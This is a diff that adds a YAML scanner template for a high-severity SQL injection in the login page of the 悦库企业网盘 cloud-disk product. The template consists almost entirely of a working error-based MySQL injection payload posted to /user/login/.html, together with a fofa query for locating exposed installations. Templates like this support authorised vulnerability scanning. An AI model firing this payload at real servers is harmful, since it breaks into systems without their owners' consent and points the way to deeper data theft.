@@ -1,0 +1,21 @@
+id: poc-yaml-ydisk-user-login-html-sqli
+info:
+  name: 悦库企业网盘 user-login-html SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 悦库企业网盘
+  fofa: app="悦库-悦库网盘"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /user/login/.html
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5({{.t1}})))),0x7e),5597)--
+    HZLK
+  expression: "status_code == 200 && \ncontains(body,t2) &&\ncontains(body,\"SQLSTATE\"\
+    ) &&\ncontains(body,\"error:\")\n"
+transport: http
